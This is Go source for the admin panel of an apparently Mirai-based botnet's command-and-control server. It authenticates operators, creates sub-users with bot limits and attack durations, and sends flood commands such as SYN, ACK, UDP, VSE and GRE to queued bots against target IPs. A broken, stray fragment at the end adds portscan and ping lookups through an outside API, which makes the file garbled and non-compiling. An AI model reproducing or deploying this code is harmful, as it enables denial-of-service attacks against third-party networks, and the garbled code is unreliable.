package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;37USER\033[0;91m: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;37PASS\033[0;91m: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91MAKING SURE YOUR LEGIT .....")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92SEEMS LEGIT ..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93ALMOST THIER :}...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94LOADING..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95LOADING.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;96LOAD..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;97LOAD...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91LOAD.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92LOAD..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93LOAD...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94LOAD..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95LOADING.")))


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Loaded | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()


    this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;91m[U] YOUR LOGGED IN NOW %s\r\n\r\n", username)))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;37m" + username + "\033[0;91m@\033[0;37mLOAD\033[0;91m:~\033[0;37m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        
        if cmd == "?" {
            this.conn.Write([]byte("\033[91m \033[35m ╔卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌╗  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌                                        UNIT                                           卌  \r\n")) 
            this.conn.Write([]byte("\033[91m \033[35m 卌    udpplain [ip] [time] dport=[port]                                                  卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    ack [ip] [time] dport=[port]          ╔══════════╗                                 卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    syn [ip] [time] dport=[port]          ║ >portscan║╗                                卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    vse [ip] [time] dport=[port]          ║  >ping   ║║                                卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    reeth [ip] [time] dport=[port]        ╚══════════╝║                                卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    greip [ip] [time] dport=[port]            ╔═════════════════════════╗              卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    std  [ip] [time] dport=[port]             ║ ROUTER SLAMMER API SOON ║              卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    xmas   [ip] [time] dport=[port]           ╚═════════════════════════╝              卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m 卌    c to make the screen great agin                                                    卌  \r\n"))
            this.conn.Write([]byte("\033[91m \033[35m ╚卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌卌╝  \r\n")) 
            this.conn.Write([]byte("\033[35m                                         UINT MIRAI BUILD FOR TRUX                                 \r\n"))
            continue
        }
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {

        this.conn.Write([]byte("\033[2J\033[1H"))
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\033[0;91m[*] New username:\033[0;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;91m[*] New password:\033[0;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;91m[*] Allowed bots:\033[0;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
                continue
            }
            this.conn.Write([]byte("\033[0;91m[*] Attack duration:\033[0;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
                continue
            }
            this.conn.Write([]byte("\033[0;91m[*] Attack cooldown:\033[0;37m  "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
               this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
                continue
            }
            this.conn.Write([]byte("\033[1;32m[*] Confirm creation (y/n)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
            } else {
                this.conn.Write([]byte("\033[0;92m[*] User created\033[0m\r\n"))
            }
            continue
        }
        if cmd == "bcount" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;91m%s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte("\033[0;31m[*] Error please try again"))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91m[*] Command sent to \033[0;37m%d \033[0;91mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

 func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
f err != nil || cmd == ">PORTSCAN" || cmd == ">portscan" {                  
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
            }
            if err != nil || cmd == ">PING" || cmd == ">ping" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue 